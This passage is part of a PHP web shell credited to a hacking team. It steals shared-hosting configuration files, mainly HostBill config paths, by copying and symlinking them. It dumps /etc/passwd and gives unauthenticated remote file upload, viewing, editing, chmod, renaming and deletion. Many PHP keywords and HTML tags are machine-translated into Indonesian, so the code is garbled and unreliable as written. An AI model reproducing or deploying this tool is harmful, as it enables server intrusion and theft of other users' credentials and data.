"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'ambil') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} lain {
$file_config = fopen("niod_configgrab/$user_niod-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"niod_Symconfig/".$user_niod."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"niod_sym404/".$user_niod."-".$nama_config.".txt");
jika($sym404){
	@mkdir("niod_sym404/".$user_niod."-".$nama_config.".txt404", 0777);
	$htaccess="Indeks Opsi FollowSymLinks
DirectoryIndex niod.htm
Nama Tajuk niod.txt
Memuaskan Setiap
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndeksAbaikan *";

@file_put_contents("niod_sym404/".$user_niod."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"niod_sym404/".$user_niod."-".$nama_config.".txt404/niod.txt");

	}

}

                    }     
		} if($_POST['config'] == 'ambil') {
            echo "<center><a href='?path=$path/niod_configgrab'><font color=lime>Selesai</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<tengah>
<a href=\"niod_sym404/root/\">SymlinkNya</a>
<br><a href=\"niod_sym404/\">Konfigurasi</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<tengah>
<a href=\"niod_symconfig/root/\">Symlinknya</a>
<br><a href=\"niod_symconfig/\">Konfigurasi</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<tengah>
<a href=\"niod_symvhost/root/\">Server Root</a>
<br><a href=\"niod_symvhost/\">Konfigurasi</a></center>";
			}
		
		
		}lain{
        echo "<form method=\"post\" action=\"\"><center>
		</select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        gema "</textarea><br><br>
        <select class=\"select\" name=\"config\" style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Konfigurasi Symlink</option>
		<option value=\"404\">Konfigurasi 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr> </center>\n";
}


}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">Unggah File :</font> <input type="file" name="file" />
<input type="kirim" nilai="Unggah" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Berkas Saat Ini : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'hapus'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['jalur'],$_POST['perm'])){
echo '<font color="green">Ubah Izin Berhasil</font><br/>';
}lain{
echo '<font color="red">Ubah Izin Gagal</font><br />';
}
}
echo '<form method="POST">
Izin : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).' " />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="kirim" nilai="Pergi" />
</form>';
}elseif($_POST['opt'] == 'ganti nama'){
if(isset($_POST['nama baru'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}lain{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['nama'] = $_POST['namabaru'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="kirim" nilai="Crotz" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['jalur'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}lain{
echo '<font color="red">Berkas Edit Gagak</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="kirim" nilai="Simpan" />
</form>';
}
echo '</center>';
}lain{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['jalur'])){
echo '<font color="green">Direktori Terhapus</font><br/>';
}lain{
echo '<font color="red">Direktori Gagal Terhapus </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}lain{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($jalan);
echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="pertama">
<td><center>Nama</peller></center></td>
<td><center>Ukuran</peller></center></td>
<td><center>Izin</peller></center></td>
<td><center>Ubah</peller></center></td>
</tr>';

foreach($scandir sebagai $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') lanjutkan;
gema '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><tengah>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

gema '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<pilih nama="opt">
<option value="">Pilih</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Ganti nama</option>
</pilih>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="kirim" nilai=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir sebagai $file){
if(!is_file($path.'/'.$file)) lanjutkan;
$ukuran = ukuran file($path.'/'.$file)/1024;
$ukuran = bulat($ukuran,3);
if($ukuran >= 1024){
$ukuran = bulat($ukuran/1024,2).' MB';
}lain{
$ukuran = $ukuran.' KB';
}

gema '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><tengah>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
gema '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<pilih nama="opt">
<option value="">Pilih</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Ganti nama</option>
<option value="edit">Edit</option>
</pilih>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="kirim" nilai=">">
</form></center></td>
</tr>';
}
gema '</tabel>
</div>';
}
echo '<br><br><center><font color="#00FFFF"> © 2020 - LUMAJANGHACKTEAM - <b><a href="https://lumajanghackteam.my.id"><font color="red ">Cubjrnet7</font></a><br><br></center>
</tubuh>
</html>';
izin fungsi($file){
$perm = fileperms($file);

if (($perm & 0xC000) == 0xC000) {
// Stopkontak
$info = 's';
} elseif (($perm & 0xA000) == 0xA000) {
// Tautan Simbolik
$info = 'l';
} elseif (($perm & 0x8000) == 0x8000) {
// Reguler
$info = '-';
} elseif (($perm & 0x6000) == 0x6000) {
// Blok khusus
$info = 'b';
} elseif (($perm & 0x4000) == 0x4000) {
// Direktori
$info = 'd';
} elseif (($perm & 0x2000) == 0x2000) {
// Karakter khusus
$info = 'c';
} elseif (($perm & 0x1000) == 0x1000) {
// pipa FIFO
$info = 'p';
} lain {
// Tidak dikenal
$info = 'u';
}

// Pemilik
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ):
(($perms & 0x0800) ? 'S' : '-'));

// Grup
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ):
(($perms & 0x0400) ? 'S' : '-'));

// Dunia
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ):
(($perm & 0x0200) ? 'T' : '-'));

kembali $info;
}
?>
